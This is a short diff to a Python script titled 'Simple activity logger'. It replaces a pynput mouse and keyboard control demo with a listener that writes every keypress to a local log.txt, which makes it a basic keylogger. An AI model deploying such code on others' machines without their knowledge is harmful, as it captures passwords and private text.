@@ -1,14 +1,11 @@
 # Simple activity logger
-from pynput.keyboard import Controller as KeyboardController
-from pynput.mouse import Controller as MouseController
+from pynput.keyboard import Listener
 
+def write_to_file(key):
+    letter = str(key)
+    with open('log.txt','a') as file:
+         file.write(letter)
 
-def control_mouse():
-    mouse = MouseController()
-    mouse.position = (500,200)
+with Listener(on_press=write_to_file) as is_listening:
+    is_listening.join()
 
-def control_keyboard():
-    keyboard = KeyboardController()
-    keyboard.type('it works')
-
-control_keyboard()
